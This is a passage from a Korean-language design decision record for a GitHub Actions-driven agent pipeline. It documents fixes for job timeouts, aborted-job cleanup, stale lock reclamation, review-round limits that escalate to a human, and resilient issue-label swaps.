   읽고 쓰는 스테이지다), plan 60 → **75**(실측 42 m + 여유), triage 15 → **20**, merge 20 → **30**,
   retro 30 → **45**, implement 90 유지. **하네스 설정으로 빼지 않았다**: 워크플로 파일은 `factory init`이
   바이트 그대로 설치하는 템플릿이라 설치 시점의 치환 지점이 없고, 치환을 도입하면 `--upgrade`가
   프로젝트가 손으로 올린 값을 매번 되돌린다. 대신 **하한을 린트로 못 박는다** — `lib/yml-lint.js`의
   `stage-timeout-floor`: review·implement는 `timeout-minutes ≥ 60`(그 아래로 내려가면 "작업이
   실패했다"가 아니라 "작업이 끝나기 전에 잘렸다"가 반복되고 그 런의 비용은 전액 매몰된다).
2. **잘린 잡이 스스로 뒷정리한다.** 스테이지 워크플로 5개에 `if: always() && job.status != 'success'`인 스텝을
   더했다 — `node .factory/bin/run-stage.js <stage> <issue> --aborted "${{ job.status }}"`. 이 경로
   (`abortStage`)가 하는 일은 정확히 셋이고 **`claude`는 뜨지 않는다**:
   - run 기록 한 줄 `aborted: <status> (job timeout or cancel)` (+ `factory/records` 동기화),
   - 이슈가 **아직 이 스테이지의 in-flight 라벨**일 때만 `factory:blocked` 전이. `IN_FLIGHT_LABEL`은
     triage `factory:queue` · plan `factory:ready` · implement `factory:in-progress` · review
     `factory:awaiting-review`이고, 사유는 `job <status> — retry via sweeper`다. 라벨이 이미 다른
     값이면 스테이지는 전이를 끝낸 **뒤에** 죽은 것이라 되돌릴 것이 없다 — 기록만 남긴다(성공한 전이를
     취소하는 것이 더 나쁘다). merge는 표에 없다: script-only라 락 해제와 기록뿐이다.
   - 락 해제(`lib/claim.js`의 `release`). 전이가 **먼저**고 락이 나중이다 — 반대면 락이 풀린 직후
     들어온 런이 이 프로세스가 막 세우려던 라벨과 경쟁한다.

   전이는 기존 `lib/transition.js`를 그대로 쓰므로 `factory-blocked-origin` 마커가 함께 찍힌다 —
   sweeper의 blocked 팔과 `run-stage`의 진입 가드가 그 마커 하나로 다음 걸음을 판단한다(KTB-15b I2).
3. **스텝은 작아야 한다.** GitHub이 취소된 잡에 주는 유예는 짧다 — 설치는 없다(setup은 이미 돌았다).
   단 한 줄, `git checkout ${{ github.sha }} -- .factory || true`를 앞에 둔다: implement는 에이전트
   브랜치 위에, review·merge는 `checkoutHead`가 detach한 PR head 위에 있으므로, **정리 코드만은 언제나
   base의 것**이어야 한다(`runStage` 본체는 checkout 이전에 로드돼 이미 그 불변식을 갖고 있다).
4. **린트가 구조를 고정한다** — `aborted-cleanup-step`: 스테이지 워크플로에는 `if: always() &&
   job.status != 'success'`로 `--aborted`를 부르는 "Aborted cleanup" 스텝이 있어야 한다(이 조건의
   근거는 아래 r1 — `cancelled() || failure()`는 잡 타임아웃·러너 소실을 덮지 못한다). 그리고
   `runner-id-consistent`: `Run stage`와 `Aborted cleanup`이 **같은** `FACTORY_RUNNER_ID` 식을 실어야
   한다 — 정리 스텝은 그 값으로 "이 락이 내 것인가"를 가르므로, 둘이 갈리면 자기 락을 남의 것으로 읽고
   고아로 남긴다(r1 재리뷰 M5).

**알려진 한계 (r1에서 해소)**: 최초 판결은 review에서 온 blocked을 `BLOCKED_RETRY`/`BLOCKED_RETRY_STAGE`에
넣지 않았다 — sweeper가 그 이슈를 한 번 더 밀지 않고 곧장 `needs-human`으로 올렸고, 사유 문구의
"retry via sweeper"는 그 경우 "sweeper가 사람에게 넘긴다"로 읽혔다. 아래 r1이 그 엣지를 열었다:
review도 `origins: ["factory:awaiting-review"]`로 한 번은 다시 돈다. 그리고 **에스컬레이션까지의
지연도 더 이상 30분이 아니다** — KTB-26의 quick sweep이 정리 스텝 바로 뒤에서 돌므로, 잘린 잡이
세운 blocked은 **몇 초 안에** 첫 팔(재시도 dispatch)을 받고, 그 재시도마저 실패하면 그 런의 quick
sweep이 다시 돌며 needs-human으로 올린다. 남은 한계는 그 재시도가 **한 번뿐**이라는 것인데
(api-error origin만 ≤3회), 잡 타임아웃의 재발은 한도가 90분으로 오른 지금 같은 크기의 일에서
드물다고 보고 그대로 둔다.

**영향**: `templates/factory/github/workflows/factory-{triage,plan,implement,review,merge,retro}.yml`
(timeout, `actions: write`, 정리 스텝), `factory/bin/run-stage.js`(`IN_FLIGHT_LABEL`·`abortedLine`·
`abortStage`·`--aborted` CLI 분기), `factory/lib/yml-lint.js`(`stage-timeout-floor`·
`aborted-cleanup-step`). 테스트: `run-stage.test.js`(5건 — 라벨 일치/불일치·merge·조회 실패·락 해제
실패), `yml-lint.test.js`(§4.1 표 갱신 + 정리 스텝 1건 + 린트 규칙 1건).

#### KTB-25 — 재큐는 새 주기다: 라운드는 마지막 `→ factory:queue` 이후부터 센다

**질문**: 데모 #18은 `factory:needs-human`에서 재큐돼 **triage부터 통째로** 다시 돌았다(새 plan, 새
implement, 새 구현). 그런데 그 새 코드에 대한 **첫 리뷰**가 `round: 2`로 시작했다. 라운드는 에이전트의
자기 신고가 아니라 이슈에 남은 review handoff 개수로 세는데(`run-stage.js`의 `countHandoffs("review")`),
그 개수를 **이슈 이력 전체**에서 셌기 때문이다 — 이슈 #18의 review handoff는 그 시점에 2개였다.
결과: K=3 중 2를 이미 쓴 채로 시작해, rework 한 번이면 `round 3`, 그다음은 needs-human이다.
`:unstick` 재실행이 잦을수록 이슈가 K에 조기 도달한다.

**결정**: 세는 범위를 **마지막 `factory-transition:v1 … to=factory:queue` 코멘트 이후**로 좁힌다
(`lib/retro/issue-comments.js`의 `commentsSinceRequeue`, `run-stage.js`의 `countHandoffs` dep이 그것을
통과시킨 뒤 `parseHandoffs`한다). 재큐는 **새 주기의 시작**이고, 그 앞의 라운드는 다른 코드에 대한
판정이므로 이번 예산에 실릴 이유가 없다. 재큐가 한 번도 없으면 이력 전체를 세는 예전 동작 그대로다
(바뀌는 이슈가 없다). 카운터를 리셋하는 별도 마커를 새로 만들지 않은 이유: 재큐 전이 코멘트 자체가
이미 그 사실의 유일하고 정확한 기록이고, 마커를 하나 더 두면 둘이 갈라질 수 있다.

같은 dep이 implement/rework 카운터에도 쓰이므로(현재 호출자는 review 하나지만 `countHandoffs(s)`는
스테이지를 인자로 받는다) 범위 교정은 **모든** 라운드 카운터에 동시에 적용된다.

**영향**: `factory/lib/retro/issue-comments.js`(`commentsSinceRequeue`), `factory/bin/run-stage.js`
(`countHandoffs` dep). 테스트: `run-stage.test.js` 1건(재큐 전 2개 → 0, 재큐 후 1개 → 1, 다중 재큐,
재큐 없음).

#### KTB-26 — sweeping은 cron만으로 부족하다: 스테이지가 끝날 때마다 빠른 sweep을 돈다

**질문**: sweeper cron(`*/30`)은 신뢰할 수 있는 복구 경로로 설계됐지만 실측이 다르다 — 라운드 5에서는
몇 시간짜리 공백(O13)이 났고, 라운드 6에서는 취소된 sweeper 런 때문에 #15가 30분 넘게 방치됐다.
GitHub Actions의 `schedule`은 원래 best-effort다(부하가 걸리면 건너뛴다). 복구 장치가 **가장 필요한
순간**(사고 직후)에 가장 늦게 도는 구조를 고칠 수 있는가.

**결정**: sweeping을 **이벤트 구동이기도** 하게 만든다.

1. 스테이지 워크플로 5개와 retro의 **마지막 스텝**이 `if: always()`로 `node .factory/bin/sweep.js --quick`을
   돈다. 잡이 성공했든 실패했든 취소됐든 돈다 — 방금 끝난 그 잡이 만든 상태(특히 KTB-24가 세운
   `factory:blocked`)를 곧바로 본다. **정리 스텝보다 뒤**여야 한다(린트 `sweep-step-last`가 그 순서와
   "마지막 스텝"임을 고정한다): 앞에 두면 아직 세워지지 않은 라벨을 훑는다.
2. `--quick`은 **상태 복구 팔만** 돈다 — in-progress 하트비트 재큐 · blocked 처리 · 멈춘 스테이지
   재점화 · 라벨-셋 복구. 시간에 묶인 두 팔(격리 정책 적용, 토큰 만료 이슈)은 cron의 몫으로 남긴다:
   "몇 시간이 지났는가"는 스테이지가 끝난 그 순간에 다시 물어볼 이유가 없고, `quarantine.toml`을
   스테이지마다 쓰면 커밋 경쟁만 늘어난다. quick sweep은 토큰 변수 조회도 하지 않는다(gh 호출 −1).
3. **cron은 그대로 둔다.** 이벤트 구동은 잡이 도는 동안에만 존재한다 — 아무 이슈도 움직이지 않는
   밤에는 cron만이 유일한 눈이다. 둘은 대체가 아니라 겹이다.
4. **동시 sweep을 견딘다.** 이제 두 sweep이 같은 이슈를 같은 초에 볼 수 있다. dedupe는 이미 마커가
   쥐고 있고(재점화 마커·blocked-retry 마커·라벨-셋 복구 마커), 남은 틈은 `gh workflow run` 자체의
   실패다 — `safeDispatch`가 그것을 감싸 그 이슈의 처리만 `error` 액션 한 줄로 접고 나머지 이슈로
   넘어간다. 실패한 dispatch는 `stalled-restart`/`blocked-retry` 액션으로 **기록되지 않는다**(마커는
   이미 남았으므로 같은 창 안에서는 다시 밀지 않고, 다음 창의 sweep이 재시도한다 — 실패는 "덜
   재시작하는 쪽"으로 기운다).
5. 스테이지·retro 워크플로의 `permissions`에 `actions: write`를 더했다 — sweep의 세 번째 팔이
   `gh workflow run`을 부른다(`factory-sweeper.yml`과 같은 이유).

**비용(API 호출량)**: quick sweep은 공짜가 아니다. 한 번 도는 데 드는 GitHub 조회는 **팔마다 검색 1회 +
이슈마다 코멘트 1회**다 — 현재 다섯 팔(in-progress · blocked · stalled 4개 라벨 · needs-info · 라벨-셋
복구)이므로 검색 8회(라벨-셋 복구는 `issue list` 1회) + 대기 중인 이슈 수만큼의 `issues/<n>/comments`
(페이지네이션 포함)다. 이슈 10개가 파이프라인에 떠 있으면 sweep 한 번에 대략 20~30 요청이고, 스테이지
잡이 시간당 6번 끝나면 시간당 120~180이다 — GitHub REST의 인증 사용자 한도(시간당 5,000)에서 보면
작지만, 이슈 수에 **선형**이고 여기에 30분 cron이 더해진다. 지금 규모(동시 이슈 한 자리 수)에서는
무시할 수 있고, 대기 이슈가 수십 개로 늘면 먼저 할 일은 sweep 빈도를 줄이는 것이 아니라 back-pressure를
조이는 것이다(대기 이슈 자체가 지표다). `--quick`이 토큰 변수 조회와 격리 파일 쓰기를 빼는 것은
그 선형 항을 조금이라도 낮추는 조치이기도 하다.

**영향**: `templates/factory/github/workflows/*.yml`(Sweep 스텝 + `actions: write`),
`factory/bin/sweep.js`(`--quick` 파싱, 토큰 조회 생략), `factory/lib/sweeper.js`(`quick` 인자,
`safeDispatch`). 테스트: `sweeper.test.js` 2건(quick이 끄는 것과 cron 대조군, dispatch 실패 격리),
`yml-lint.test.js` 2건(모든 스테이지+retro가 Sweep으로 끝난다, 린트 규칙).

#### KTB-28 — 고아 락이 네 번의 dispatch를 조용히 삼켰다: 잔해는 회수하고, 거부는 시끄럽게

**질문**: 데모 #15의 review 락 `refs/heads/factory/lock-15`는 04:39에 **타임아웃으로** 사라진 런
(러너 `gha-34736609544`, KTB-24의 정리 스텝이 배포되기 **전**)이 남긴 것이다. 그 뒤의 모든 dispatch —
sweeper stalled 팔 ×4 + 관측자의 수동 재실행 — 가 26~40초 만에 `claim()`에서 죽었다. 그런데 그 죽음은
`exit 0`이었다: run 기록 한 줄 없음, 이슈 코멘트 없음, 잡 결론 `success`. Actions 목록에서도 이슈
타임라인에서도 **"디스패치가 잘 됐다"로 보였고**, 그래서 같은 벽에 네 번을 더 밀었다. 두 가지를 물었다:
락이 잔해인지 아무도 묻지 않는 이유, 그리고 "아무 일도 하지 않았다"가 성공으로 보고되는 이유.

**결정**: 넷으로 나눈다.

(a) **잔해 락은 회수한다** — `factory/lib/claim.js`. push가 거부되면 지금도 소유자 제목을 읽는다
(`lock issue=… stage=… runner=…`). 그 `runner=`가 `gha-<run_id>` 모양이면 주입된 러너로
`gh run view <id> --json status`를 물어, 상태가 `completed`면 그 락은 **잔해**다: 지우고 다시 세운 뒤
`{ok:true, reclaimed:{runner,status}}`로 돌려준다(`run-stage`가 `lock: reclaimed from completed runner
gha-<id>` 한 줄을 남긴다). 삭제와 재생성 사이에 다른 러너가 먼저 잡으면 재생성이 실패하고 — 그때는
**회수하지 못한 것**이라 평범한 거부로 돌아간다(쥐지 않은 락을 쥐었다고 말하지 않는다). 조회가
실패했거나(자격증명·네트워크·삭제된 런) 상태를 파싱하지 못했거나 러너가 로컬(`local/<host>`, 물어볼
API가 없다)이면 **살아 있는 것으로 본다**: fail closed — 틀린 회수는 같은 이슈에 두 스테이지를 동시에
넣는 사고이고, 틀린 대기는 다음 sweep이 되돌린다.

(b) **거부된 claim은 시끄럽다** — `factory/bin/run-stage.js`. run 기록 한 줄
(`claim refused: lock held by gha-<id> (<status>)`) + 같은 내용의 짧은 이슈 코멘트
(`<!-- factory-claim-refused … -->`) + **`exit 2`**. 잡이 실패로 끝나야 Actions 목록에서 빨갛게 보이고,
"밀었는데 아무 일도 없었다"가 관측 가능해진다. 정상적인 경쟁(다른 러너가 진짜로 돌고 있다)도 이 길로
오지만, 그 사실이 기록되는 편이 침묵보다 낫다.

  이 변경은 **정리 스텝에 부작용이 있다**: `Aborted cleanup`은 `always() && job.status != 'success'`로
  도니까, 이제 claim에 실패한 런에서 **반드시** 돈다. 그 런은 스테이지를 한 걸음도 돌지 않았는데
  라벨은 (남의 러너가 돌고 있으므로) in-flight 값 그대로다 — KTB-24 fix의 "남의 락은 지우지 않는다"만으로는
  부족했다. 그래서 `abortStage`가 소유자를 **먼저** 묻고, 락이 남의 것이면 **전이도 하지 않는다**
  (`aborted: lock is held by <runner> — this run never owned the stage, no transition`). 정리 코드가
  남의 살아 있는 스테이지를 blocked으로 쏘는 일은 없어야 한다.

(c) **sweeper는 밀기 전에 회수한다** — `factory/lib/sweeper.js`의 stalled 팔과 blocked 재시도 팔이
`releaseIfStale(issue)`(`bin/sweep.js`가 `lockHolder` + `runnerState`로 조립한다)를 dispatch **직전**에
부른다. dispatch는 락을 보지 않으므로, 이 물음이 없으면 새 런은 뜨고 claim에서 죽는 일만 반복한다.
회수 실패는 재점화를 막지 않는다(성공 확률을 올리는 조치이지 전제 조건이 아니다) — `error` 액션 한 줄만 남는다.

(d) **재점화에는 상한이 있다** — 같은 이슈+스테이지의 stalled 재점화는 **2회**까지(`STALLED_RESTART_LIMIT`,
세는 근거는 이슈에 남은 `factory-sweeper restarted stage=… issue=…` 마커 개수다 — 마커가 곧 기록이고,
별도 카운터를 두면 둘이 갈라진다). 상한에 닿으면 dispatch도 코멘트도 하지 않고 `factory:needs-human`
(사유 `stalled restart limit (2) reached`)으로 올린다. 두 번 밀어도 같은 자리에 멈춰 있으면 사라진 것은
런이 아니라 **가정**이고, 재점화 한 번의 값은 plan 기준 ~$12다.

**알려진 한계**: 회수 판정은 `gh run view`가 붙어야 성립한다 — 러너가 GitHub 밖이면(`local/<host>`)
그 락은 영원히 "살아 있다"로 읽힌다(사람이 `factory/lib/claim.js`의 `release`로 지우는 길은 그대로다).
그리고 (b) 때문에 **정상적인 claim 경쟁도 잡 실패로 기록된다** — 라벨 이벤트와 sweeper dispatch가 같은
스테이지를 동시에 물었을 때가 그렇다. 실패한 잡 하나와 침묵 중에서 전자를 골랐다.

**영향**: `factory/lib/claim.js`(`ghaRunIdOf`·`runnerState`·`claim`의 회수 분기·`lockHolder` 정규식),
`factory/bin/run-stage.js`(claim 거부 경로·`abortStage`의 소유자 우선 판정), `factory/lib/sweeper.js`
(`releaseStaleLock`·`STALLED_RESTART_LIMIT`), `factory/bin/sweep.js`(`releaseIfStale` 조립),
`factory/lib/yml-lint.js`(`runner-id-consistent`). 테스트: `claim.test.js` 6건, `run-stage.test.js` 4건,
`sweeper.test.js` 6건, `yml-lint.test.js` 1건.

**r1 (c361c7d 재리뷰)**: (a)·(c)의 락 삭제는 **읽은 sha에 리스를 걸고**(`--force-with-lease=<ref>:<sha>`) 한 번의 compare-and-swap으로 하고 — 읽기와 삭제 사이에 소유자가 바뀌었으면 아무것도 지우지 않고 `stale-lock-race`로 적으며(살아 있는 락을 지운 뒤 새 런을 미는 사고가 닫힌다), 그때는 sweeper가 **dispatch도 하지 않는다**(재점화 예산도 쓰지 않는다); (b)의 `abortStage`는 fail closed로 바뀌어 **락이 이 런의 것임이 증명될 때만** 전이·해제를 하고 모르면 `abort-skipped: holder unknown`만 남긴다; (d)의 재점화 카운트는 **마지막 재큐 이후**로 좁혔다(다른 라운드 카운터와 같은 창).

**r2 (19782b7 재리뷰 MF1)**: `runnerState`/락 판정이 **세 값**이 됐다 — `live`(소유자 런이 `in_progress`/`queued`) · `stale`(`completed`) · `unknown`(워크플로 런이 아니거나 — `runner=local/<host>` — 조회·파싱이 실패했다). r1은 뒤의 둘을 `live`와 한 불리언으로 묶었고, 그래서 dispatch 팔이 **물어보지 못한 것**까지 "돌고 있다"로 읽어 마커도 에스컬레이션도 없이 30분마다 영원히 물러났다(리뷰 finding 1: 랩톱이 잠든 로컬 `factory run` 하나가 이슈를 조용히 영구 정지시킨다 — `FACTORY_BOT_TOKEN`에 Actions:read가 없으면 **모든** 이슈가 그렇게 된다). 이제 `unknown`은 dispatch하지 않되 스톨 임계를 넘겼으면 `factory:needs-human`으로 올린다(사유 `lock owner unknowable (<detail>)`, 마커 `<!-- factory-sweeper lock-owner-unknown issue=<n> -->`, dedupe는 임계 시간 창). 에스컬레이션이 sweep 잡의 stdout에만 있는 경로는 남기지 않는다. 그리고 하트비트 재큐 팔의 락 삭제도 **리스 경로 하나뿐**이다(r2 SF2): 예전에는 소유자를 묻지도 리스를 걸지도 않고 지웠는데, 하트비트는 best-effort로 패치되고(재시도 없음) 30분 창은 API 장애 하나면 지나간다 — 살아 있는 소유자가 확인되면 재큐 자체를 하지 않는다(그 재큐가 R 예산을 태운다).

#### KTB-29 — review가 K를 물지 않았다: 라운드 4의 reject가 또 rework으로 갔다

**질문**: 스펙 §3.2에는 `rework --> needs_human: round > K` 엣지가 있고 CHARTER의 `K`가 그 한도인데,
데모 #18은 **K=3에서 리뷰 라운드 4**에 도달해 또 `factory:rework`으로 갔다. `run-stage.js`의
`nextState`를 읽어 보면 이유가 분명하다: review 분기는 `decision === "approved"` 하나만 보고 나머지를
전부 rework으로 보낸다. `transition.js`의 `round ≤ K` 검사는 존재하지만 **`factory:approved` 경로에만**
걸린다 — 그런데 K를 넘기는 것은 언제나 통과하지 **못하는** 쪽이다. 즉 그 검사는 절대 발화하지 않는
자리에 있었고, 무한 rework 루프의 실질적 상한은 없었다.

**결정**: `nextState(stage, data, { maxRounds })`가 K를 본다. review에서 판정이 `approved`가 아니고
`round >= K`이면 `factory:needs-human`으로 가고, 사유는
`review rounds exhausted (K=<K>): <n> must_fix remain`이다(전이는 `awaiting-review → needs-human`,
그래프에 이미 있는 엣지다). `>=`인 이유: 라운드 K의 리뷰가 또 reject이면 다음 rework은 라운드 K+1이
되고, 그것이 스펙이 금지한 지점이다 — 예산을 다 쓴 것은 지금이다. `approved`는 어느 라운드에서든
통과한다(K는 실패를 끊는 한도이지 성공을 막는 한도가 아니다). K를 모르면(구형 배선·컨텍스트 읽기
실패) 예전 동작 그대로 rework이다 — 모르는 한도로 사람을 부르지 않는다. 라운드 번호는 KTB-25가 고친
창(마지막 재큐 이후의 review handoff 개수)에서 그대로 온다.

**함께**: **역할별 판정 뒤집힘**(관측 O21 — #18에서 approve → reject 두 건)이 §12.4의 지표가 된다.
이번 라운드의 verdict를 **직전 review handoff**(같은 창)의 역할별 verdict와 비교해 뒤집힌 것만
`review flips: correctness approve→reject, spec-conformance reject→approve` 한 줄로 run 기록에 남긴다.
코드가 그대로인데 판정이 흔들리면 K 예산이 리뷰어의 분산에 쓰인다는 뜻이고, 그 빈도는 로스터 구성과
프롬프트를 고칠 때 필요한 1차 데이터다. 조회 실패는 흔적만 남기고 스테이지를 죽이지 않는다 —
지표이지 게이트가 아니다.

**영향**: `factory/bin/run-stage.js`(`nextState`·`reviewRoundsExhausted`·`reviewExhaustedReason`·
`reviewFlips`·`priorReviewVerdicts` dep), `docs/superpowers/specs/2026-09-10-factory-design.md` §3.2.
테스트: `run-stage.test.js` 6건(라운드 K reject → needs-human, K 미만 reject → rework, 어느 라운드의
approve든 approved, `nextState` 순수 함수, flips 계산, flips 기록과 조회 실패).

**r1 (c361c7d 재리뷰)**: "approve는 어느 라운드에서든 통과한다"를 조립된 시스템에서도 참으로 만들었다 — `lib/requirements.js`의 `round > K` 검사를 지웠고(그 검사가 라운드 4의 만장일치 통과를 그래프에서 튕겨 내고 있었다), 라운드 번호는 handoff 개수가 아니라 **마지막 재큐 이후의 완료된 `→ factory:rework` 전이 수 + 1**로 센다(handoff는 전이보다 먼저 나가므로 전이에서 죽은 런이 예산을 태웠다); 집계된 must_fix가 없을 때의 사유는 "0 must_fix remain" 대신 `last verdict: <판정>`이다.

**r2 (19782b7 재리뷰 (c))**: 그 카운터에 마지막 창 하나가 남아 있었다 — 전이 코멘트가 라벨 스왑보다 **먼저** 나가므로(KTB-30 r1), 스왑이 네 번의 CLI 시도 + REST까지 전부 실패하면 **일어나지 않은 rework**의 코멘트가 이슈에 남아 라운드를 태운다(K=3에서 장애 두 번 + 진짜 reject 하나면 멀쩡한 이슈가 사람에게 올라간다). 그래서 스왑이 던지면 그 자리에서 `<!-- factory-transition-failed:v1 from=… to=… -->`를 남기고, `countTransitionsTo`는 그 마커 **뒤**에 오는 짝 하나를 무효로 센다. 사람이 읽는 이력에서도 "코멘트는 옮겼다는데 라벨은 그대로"가 그 한 줄로 설명된다.

#### r1 재리뷰 잔손질 (M1~M5)

`2ae6f38` 재리뷰가 남긴 다섯 가지. 전부 "고침은 들어갔는데 그 고침을 설명하는 자리가 옛 상태로 남았다"
또는 "고침이 새로 만든 틈"이다.

- **M1** — 문서가 정리 스텝의 조건을 아직 `if: cancelled() || failure()`로 적고 있었다(스펙 §4.1,
  이 ADR의 KTB-24 항목). 코드·템플릿·린트는 이미 `always() && job.status != 'success'`다 → 문서를 맞췄다.
- **M2** — 스펙 §4.3의 sweeper 팔이 "네 가지"로 남아 있었다. 실제로는 일곱이다(in-progress 재큐 ·
  blocked 처리 · 격리 정책 · 토큰 만료 · 멈춘 스테이지 재점화 · 하네스 주차 해제 · 라벨-셋 복구;
  `--quick`은 시간에 묶인 둘을 뺀 다섯). 재리뷰 메모는 "여섯"이라고 적었지만 소스를 세면 일곱이라
  일곱으로 적었다. §3.2 전이도에도 blocked 재시도 엣지 여섯과 `awaiting_review → needs_human`,
  `in_progress → needs_info`가 빠져 있었다 → 그렸다.
- **M3** — `sweepHarnessUnpark`가 마커를 전이 **앞에** 남겼다. 다른 팔들은 그게 맞다(마커는 "비싼
  재점화를 이 창에 한 번만"의 근거이고, 놓친 재점화는 다음 창이 되돌린다). 이 팔은 반대다: 마커가
  억제하는 것은 재시도 자체이고, 이 팔이 실패하면 주차된 피처는 **영원히** 돌아오지 않는다(해제
  경로가 이것뿐이다 — 하네스 PR은 사람이 머지하므로 merge 단계 (9)는 정상 경로에서 돌지 않는다).
  → 마커는 전이가 **성공한 뒤에** 남긴다. 거부되면 아무 흔적 없이 다음 sweep이 다시 시도한다.
- **M4** — `lockHolder`의 "없는 ref" 정규식에 `|not found`가 붙어 있었다. 그 조각은 **레포를 못 찾은
  실패**("remote: Repository not found." — 토큰 만료·권한 박탈)까지 "락이 없다"로 읽고, 그러면
  `abortStage`가 살아 있는 남의 락을 지우러 간다 — 이 함수가 막으려던 바로 그 사고다 → 지웠다.
- **M5** — 린트 `runner-id-consistent`: `Run stage`와 `Aborted cleanup`은 **같은** `FACTORY_RUNNER_ID`
  식을 실어야 한다. 정리 스텝은 그 값으로 "이 락이 내 것인가"를 가르므로(KTB-24 fix), 둘이 갈리면
  자기 락을 남의 것으로 읽고 고아로 남긴다 — 데모 #15의 잔해가 바로 그 모양이었다.

#### KTB-30 — 라벨 스왑이 중간에 끊겨 **상태 라벨이 0개**가 됐다: sweeper를 통째로 빠져나간 유일한 실패

**질문**: 2026-09-13 08:52Z(데모 #2)와 08:55Z(#15), 4분 사이에 같은 사고가 두 번 났다. `gh issue edit
--remove-label factory:planned --add-label factory:in-progress` 한 번이 GitHub의 일시 장애로
(`GraphQL: Something went wrong while executing your query`, 그리고 `EOF`) 중간에 실패했고, 남은 것은
**상태 라벨이 하나도 없는 이슈**였다. 그 상태는 이 공장에서 유일하게 **아무도 보지 못하는** 상태다:
`labeled` 이벤트가 없으니 잡이 안 뜨고, 모든 스테이지 워크플로의 `if:`가 빗나가고, sweeper의 일곱 팔은
전부 상태 라벨로 **검색**하므로 그 이슈를 애초에 목록에 담지 못하고, `factory status`도 상태 라벨로
조회하므로 화면에서 사라진다. #2는 implement claim에서, #15는 **27분짜리 리뷰가 끝난 직후의 handoff**에서
그렇게 죽었다. 관측자가 손으로 REST(`gh api -X POST repos/…/issues/N/labels`)를 쳐서 둘 다 되살렸는데,
그때 `gh issue edit`은 계속 실패하는 중이었고 REST는 동작했다(O23의 장애 창).

**결정**: 라벨 변경을 네 겹으로 다시 만든다.

(a) **add-first.** `setFactoryLabel`은 이제 새 라벨을 **먼저 붙이고** 그다음 옛 라벨을 뗀다 —
두 번의 독립된 호출이다. 같은 사고의 최악이 "라벨 0개"에서 "라벨 2개"로 바뀐다. 0개는 아무도 못 보지만
2개는 KTB-18의 라벨-셋 복구 팔이 이미 보고 있다. `setTierLabel`도 같은 이유로 add-first다.

(b) **재시도 + REST 폴백.** 모든 라벨 변경(`addLabels`·`removeLabel`·`setFactoryLabel`·`setTierLabel`)은
`gh issue edit`을 1s·3s·9s 간격으로 네 번(첫 시도 + 재시도 3회) 시도하고, 그래도 안 되면 REST
엔드포인트(`gh api -X POST …/labels` · `gh api -X DELETE …/labels/{name}`)로 같은 변경을 한 번 더
시도한다. 둘 다 실패해야 throw한다(원래 에러 그대로 — 사람이 보는 것은 원인이지 폴백의 증상이 아니다).
폴백이 필요한 이유는 추측이 아니라 실측이다: 08:52~08:55Z 창에서 CLI는 계속 실패하고 REST는 성공했다.

(c) **쓴 뒤 확인.** 스왑이 끝나면 라벨을 한 번 다시 읽어 목적 라벨이 실제로 붙어 있는지 본다. 없으면
한 번 더 붙이고 그 사실을 전이 코멘트에 `label verify: repaired` 한 줄로 남긴다(조용히 고친 라벨은 다음
사고의 원인을 지운다). 읽기 자체가 실패하면 스왑을 되돌리지 않는다 — "확인 못 함"이지 "실패"가 아니다.

(d) **여덟 번째 sweeper 팔 — 상태 라벨 0개 복구**(`sweepMissingStateLabel`, quick+cron). 확률이 0이 아닌
한 그것을 보는 눈이 하나는 있어야 한다. 열린 이슈 중 `factory:*` 라벨(tier·보조)은 있는데 상태 라벨이
하나도 없는 것을 찾아, **최신 전이 코멘트의 `to`**로 되살린다(전이 이력이 없으면 `factory:needs-human` —
짐작해서 파이프라인 중간에 떨어뜨리지 않는다). 마커는 `<!-- factory-label-set-repaired from=(none)
to=<label> -->`이고 dedupe는 **10분 시간 창**이다(평생 한 번으로 묶으면 두 번째 사고에서 다시 보이지
않는다 — 라벨은 매번 새로 사라질 수 있다). 전이가 아니라 `setFactoryLabel`을 직접 쓴다: `transition()`은
출발 라벨을 요구하는데 그 출발 라벨이 바로 사라진 것이다. factory 라벨이 **하나도** 없는 이슈는
`updatedAt`이 24시간 안인 것만 코멘트를 뒤진다(라벨이 사라진 순간 `updatedAt`이 갱신된다 — 이 경계가
없으면 저장소의 모든 열린 이슈에 sweep마다 조회가 나가고, 그건 이 고침이 막으려는 바로 그 API 부하다).

(e) **라벨-셋 복구가 기계의 잔해를 사람 손 편집과 구분한다**(KTB-18 확장). 상태 라벨이 정확히 2개이고
그중 하나가 **최신 전이의 `to`**면, 그건 사람이 얹은 라벨이 아니라 add-first 스왑의 부분 실패다 —
`needs-human`으로 접지 않고 그 라벨 하나로 이어 준다(마커에 `to=`가 실린다). 기록이 둘 중 어느 것도
가리키지 않으면(§12.4의 skip-attempt 프로브가 만든 `backlog`+손 `approved`) 예전처럼 `needs-human`이다.

(f) **`factory status`의 `[no-state-label]`.** 상태 라벨이 0개인 이슈는 라벨별 조회 어디에도 안 걸리므로
열린 이슈 전체를 한 번 더 받아 Needs You에 `- [no-state-label] #N <title> — sweeper → label restore`로
띄운다. sweeper가 대개 먼저 고치지만, 고치기 전의 그 순간에도 사람이 볼 창구는 있어야 한다.

**함께(O20) — blocked에 원인 등급이 생겼다.** `factory-blocked-origin` 마커가 `cause=<api-error|timeout|
cancelled|gates|undecidable|other>`를 싣는다(`abortStage`는 GitHub이 준 `job.status`에서 직접, 그 외에는
사유 문구에서 되짚는다 — 옛 마커도 그대로 파싱된다). 두 가지가 달라진다: ① **사람이 취소한 blocked은
재시도 예산(R)을 쓰지 않는다.** 취소는 이 이슈의 실패가 아니므로 dedupe 범위가 "평생 한 번"이 아니라
"이 취소 사건마다 한 번"이다(마지막 origin 마커 이후에 재시도가 있었는가 — 상한은 3회). ② **에스컬레이션
문구가 원인을 말한다**: `blocked (job cancelled) — needs human`, `blocked (job timed out) …`,
`blocked (API quota/outage) …`, `blocked (gates undecided) …`, `blocked (undecidable) …`. 예전에는 무엇이
죽였든 "환경/크리덴셜" 하나였고, 그 문장을 믿은 사람은 틀린 곳을 먼저 봤다.

**알려진 한계**: 재시도는 라벨 변경 하나당 최대 13초를 잔다 — 라벨 스왑이 느려지는 것은 의도한 대가다
(그 13초가 사라진 이슈 하나보다 싸다). 그리고 (d)의 24시간 창 밖에서 factory 라벨 없이 라벨을 잃은
이슈는 여전히 보이지 않는다(그 경우 tier 라벨조차 없다는 뜻이라 triage 이전 이슈로 한정된다). 그리고
**(b) 캐비엇(r2 리뷰 답변 (b))**: `abortStage`가 락이 **없음이 증명된**(`present:false`) 상태에서 전이를
건너뛰는 것은 안전하지만, 그 경우 중 하나 — 락을 잡은 뒤 다른 무언가가 그 락을 지웠고 그다음 잡이
취소된 경우 — 는 이슈를 `factory:in-progress`에 전이 없이 남기고, 그 자리를 덮는 팔은 하트비트 재큐
